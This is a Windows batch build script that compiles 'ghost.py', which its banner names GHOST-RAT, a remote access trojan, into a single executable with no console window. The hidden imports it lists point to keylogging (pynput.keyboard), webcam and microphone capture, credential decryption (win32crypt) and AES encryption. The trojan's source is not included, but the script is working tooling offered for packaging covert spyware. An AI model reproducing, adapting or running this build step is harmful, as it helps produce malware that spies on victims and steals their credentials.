@echo off
REM Build script for ghost.py to ghost.exe
REM Run this on Windows

echo ============================================================
echo GHOST-RAT Build Script (Batch)
echo ============================================================

REM Check if ghost.py exists
if not exist "ghost.py" (
    echo [ERROR] ghost.py not found!
    pause
    exit /b 1
)

REM Check if PyInstaller is installed
pyinstaller --version >nul 2>&1
if errorlevel 1 (
    echo [ERROR] PyInstaller not found!
    echo [*] Install it with: pip install pyinstaller
    pause
    exit /b 1
)

echo [*] Building ghost.py into ghost.exe...
echo.

REM Build with PyInstaller
pyinstaller --noconsole --onefile --name ghost --clean ^
    --hidden-import win32timezone ^
    --hidden-import win32api ^
    --hidden-import win32con ^
    --hidden-import win32gui ^
    --hidden-import win32process ^
    --hidden-import win32security ^
    --hidden-import win32crypt ^
    --hidden-import win32com.client ^
    --hidden-import pynput.keyboard ^
    --hidden-import PIL._tkinter_finder ^
    --hidden-import cv2 ^
    --hidden-import numpy ^
    --hidden-import soundcard ^
    --hidden-import soundfile ^
    --hidden-import pyaudio ^
    --hidden-import Crypto ^
    --hidden-import Crypto.Cipher ^
    --hidden-import Crypto.Cipher.AES ^
    ghost.py

if errorlevel 1 (
    echo.
    echo [ERROR] Build failed!
    pause
    exit /b 1
)

echo.
echo [+] Build successful!
echo [+] Executable location: dist\ghost.exe

REM Get file size
for %%A in ("dist\ghost.exe") do echo [+] Size: %%~zA bytes

echo.
echo [*] Build complete! Executable is in the 'dist' folder.
pause

